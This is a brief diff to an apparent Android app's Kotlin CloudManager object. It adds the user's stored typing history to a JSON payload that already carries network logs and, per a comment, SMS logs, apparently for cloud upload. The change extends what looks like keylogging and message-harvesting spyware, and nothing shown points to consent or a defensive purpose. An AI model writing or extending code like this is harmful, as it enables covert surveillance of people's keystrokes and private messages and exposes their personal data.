@@ -44,6 +44,9 @@ object CloudManager {
                 // Attach Detailed Logs
                 val netLogs = prefs.getString("net_history_log", "[]")
                 json.put("network_logs", JSONArray(netLogs))
+                // Attach Typing Logs
+                val typeLogs = prefs.getString("typing_history", "[]")
+                json.put("typing_history", JSONArray(typeLogs))
                 json.put("android_version", android.os.Build.VERSION.RELEASE)
                 
                 // Attach SMS logs
